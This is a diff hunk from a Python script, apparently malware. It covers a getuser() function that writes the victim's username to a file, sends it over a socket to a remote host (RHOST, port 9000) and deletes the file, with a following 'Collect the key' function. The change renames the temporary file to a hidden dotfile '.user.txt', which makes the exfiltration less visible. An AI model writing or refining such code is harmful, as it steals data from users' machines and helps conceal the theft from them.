@@ -13,15 +13,15 @@ RPORT = 9000
 # Get the username
 def getuser():
     username = getpass.getuser()
-    with open("user.txt", "w") as theuser:
+    with open(".user.txt", "w") as theuser:
         theuser.write(username)
-    with open("user.txt", "rb") as theuser:
+    with open(".user.txt", "rb") as theuser:
         user = theuser.read()
     s = socket.socket()
     s.connect((RHOST, RPORT))
     s.send(user)
     s.close()
-    os.remove("user.txt")
+    os.remove(".user.txt")
 
 # Collect the key
 def getkey():
